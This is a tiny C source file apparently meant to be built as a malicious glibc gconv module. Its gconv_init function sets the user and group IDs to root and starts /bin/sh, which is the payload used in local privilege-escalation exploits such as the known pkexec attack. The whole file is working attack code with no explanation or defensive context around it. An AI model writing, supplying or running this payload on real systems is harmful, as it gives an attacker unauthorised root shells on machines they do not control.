#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv(void) {
}

void gconv_init(void *step)
{
	char * const args[] = { "/bin/sh", NULL };
	setuid(0);
	setgid(0);
	execve(args[0], args, NULL);
	exit(0);
}
